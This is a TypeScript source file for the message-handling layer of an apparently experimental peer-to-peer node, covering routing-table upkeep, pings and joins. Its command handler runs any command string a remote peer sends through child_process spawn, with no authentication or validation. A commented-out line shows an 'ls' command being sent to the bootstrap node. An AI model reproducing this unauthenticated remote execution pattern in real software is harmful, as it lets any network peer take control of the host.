import { first, tap, filter, delay } from 'rxjs/operators';
import { spawn } from 'child_process';

import { Address, Contact } from '@models';
import { P2PLayer } from '@layers/p2p-layer/p2p-layer';
import { Message } from '@protobuf/Message_pb';
import logger from '@utils/logging';
import { StringDecoder } from 'string_decoder';

export class BusinessLayer {
  private pingedNodes: Contact[] = [];

  constructor(private worker: P2PLayer) {
    this.handleMessages();
  }

  joinNetwork(bootstrapNode: Address) {
    this.worker.findNode({
      to: bootstrapNode
    });

    this.worker
      .on(Message.MessageType.FOUND_NODES)
      .pipe(
        first(),
        this.addNodeToRoutingTable(),
        this.pingNodes(),
        delay(1000),
        tap(() => {
          this.pingedNodes.forEach((node) =>
            this.worker.routingTable.removeNode(node)
          );
          this.pingedNodes = [];
          // this.worker.command({
          //   command: 'ls',
          //   to: new Contact({ address: bootstrapNode })
          // });
        })
      )
      .subscribe();

    return true;
  }

  close() {
    this.worker.leave();
    this.worker.close();
  }

  private handleMessages() {
    this.handleCommandMessage();
    this.handleFindNodeMessage();
    this.handleLeaveMessage();
    this.handlePingMessage();
    this.handlePingResponseMessage();
  }

  private handleCommandMessage() {
    this.worker
      .on(Message.MessageType.COMMAND)
      .pipe(
        tap(async (msg) => {
          console.log('working');
          const commandMsg = msg.getCommand();
          if (commandMsg) {
            if (commandMsg.getShouldrespond()) {
              // const { stdout, stderr } = await exec(commandMsg.getCommand());
              // this.worker.co
            } else {
              const bla = spawn(commandMsg.getCommand());
              bla.stdout.on('data', (data: Buffer) => {
                console.log(new StringDecoder('utf8').write(data));
              });
            }
          } else {
            logger.warn('Business layer: Command message not set.');
          }
        })
      )
      .subscribe();
  }

  private handleFindNodeMessage() {
    this.worker
      .on(Message.MessageType.FIND_NODE)
      .pipe(
        this.addNodeToRoutingTable(),
        tap((msg) => {
          const sender = checkSender(msg);
          const node = msg.getFindnode();
          if (node) {
            this.worker.foundNodes({
              to: Contact.from(sender),
              nodes: this.worker.routingTable.getNearestNodes(node.getGuid())
            });
          } else {
            logger.warn('Business layer: FindNode message not set.');
          }
        })
      )
      .subscribe();
  }

  private handleLeaveMessage() {
    this.worker
      .on(Message.MessageType.LEAVE)
      .pipe(
        tap((msg) => {
          logger.info('Business layer: got leave message');
          const sender = checkSender(msg);
          this.worker.routingTable.removeNode(Contact.from(sender));
        })
      )
      .subscribe();
  }

  private handlePingMessage() {
    this.worker
      .on(Message.MessageType.PING)
      .pipe(
        this.addNodeToRoutingTable(),
        tap((msg) => {
          const sender = checkSender(msg);
          this.worker.pingResponse({
            to: Contact.from(sender)
          });
        })
      )
      .subscribe();
  }

  private handlePingResponseMessage() {
    this.worker
      .on(Message.MessageType.PING_RESPONSE)
      .pipe(
        filter((msg) => {
          const sender = checkSender(msg);
          return this.pingedNodes.includes(Contact.from(sender));
        }),
        this.addNodeToRoutingTable()
      )
      .subscribe();
  }

  private addNodeToRoutingTable(node?: Address) {
    return tap((msg: Message) => {
      const sender = checkSender(msg);
      this.worker.routingTable.addNode(Contact.from(sender));
    });
  }

  private pingNodes() {
    return tap((msg: Message) => {
      const found = msg.getFoundnodes();
      const nodes = found ? found.getNodesList() : [];
      nodes.map(Contact.from).forEach((node) => {
        logger.info(`Business layer: Pinging node: ${node.guid}`);
        this.worker.ping(node);
        this.pingedNodes = [...this.pingedNodes, node];
      });
    });
  }
}

function checkSender(msg: Message): Message.Contact {
  const sender = msg.getSender();
  if (!sender) {
    logger.error('Business layer: Message sender not set.');
    throw new Error('Business layer: Message sender not set.');
  } else {
    return sender;
  }
}
